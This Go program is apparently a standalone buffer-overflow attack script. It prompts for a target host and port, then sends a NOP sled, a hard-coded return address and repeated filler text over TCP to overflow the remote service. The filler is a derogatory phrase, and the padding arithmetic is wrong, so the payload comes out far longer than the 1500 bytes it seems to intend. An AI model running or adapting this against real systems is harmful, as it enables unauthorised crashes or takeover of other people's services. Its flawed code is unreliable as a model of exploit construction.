package main

import (
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	var (
		host string
		port string
	)

	fmt.Print("Host You Would Like To Overflow: ")
	fmt.Scan(&host)
	fmt.Print("Port To Connect On: ")
	fmt.Scan(&port)

	one := strings.Repeat("\x90", 1052)
	two := "\xB5\x42\xA8\x68"
	three := strings.Repeat("\x90", 30)

	conn, err := net.Dial("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Connection Has Failed", err.Error())
		os.Exit(1)
	}

	final := strings.Repeat("Botnets Are Gay", (1500 - len(one+two+three)))

	buf := one + two + three + final

	_, err = conn.Write([]byte(buf))
	if err != nil {
		fmt.Println("\nAn Error Has Occured Whilst Attempting To Overflow", err.Error())
		os.Exit(1)
	}

	fmt.Println("\nOverflow Has Been Sent")
	conn.Close()
}
